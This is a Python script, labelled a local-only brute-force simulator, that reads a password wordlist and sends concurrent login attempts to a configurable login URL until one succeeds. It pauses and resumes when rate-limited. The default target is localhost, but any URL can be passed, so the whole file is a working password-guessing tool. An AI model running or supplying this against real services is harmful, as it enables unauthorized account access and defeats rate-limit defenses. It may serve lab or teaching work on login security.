import requests, argparse, time
from concurrent.futures import ThreadPoolExecutor, as_completed
DEFAULT_URL = "http://127.0.0.1:5000/login"
def try_password(url, username, password, timeout=5):
    try:
        r = requests.post(url, json={"username": username, "password": password}, timeout=timeout)
    except requests.RequestException as e:
        return {"password": password, "status": "error", "detail": str(e)}
    if r.status_code == 200:
        data = r.json()
        if data.get("success"):
            return {"password": password, "status": "success", "detail": data}
        else:
            return {"password": password, "status": "failed", "detail": data}
    elif r.status_code == 429:
        return {"password": password, "status": "rate_limited", "detail": r.text}
    else:
        return {"password": password, "status": f"http_{r.status_code}", "detail": r.text}
def run_wordlist(url, username, wordlist_path, concurrency=4, delay=0.05):
    results=[]
    with open(wordlist_path,"r",encoding="utf-8") as fh:
        passwords=[line.strip() for line in fh if line.strip()]
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures=[]
        for pwd in passwords:
            futures.append(ex.submit(try_password,url,username,pwd))
            time.sleep(delay)
        for fut in as_completed(futures):
            res=fut.result()
            print(f"[{res['status']}] {res['password']}")
            results.append(res)
            if res["status"]=="success":
                print("===> FOUND PASSWORD:", res["password"])
                break
            if res["status"]=="rate_limited":
                print("Rate limited. Sleeping for 2 seconds...")
                time.sleep(2)
    return results
if __name__=="__main__":
    parser=argparse.ArgumentParser(description="Brute-Force Simulator (local-only)")
    parser.add_argument("--user","-u",required=True)
    parser.add_argument("--wordlist","-w",default="wordlist.txt")
    parser.add_argument("--url",default=DEFAULT_URL)
    parser.add_argument("--concurrency","-c",type=int,default=4)
    parser.add_argument("--delay","-d",type=float,default=0.05)
    args=parser.parse_args()
    print("Starting brute-force simulator (local only)")
    run_wordlist(args.url,args.user,args.wordlist,concurrency=args.concurrency,delay=args.delay)
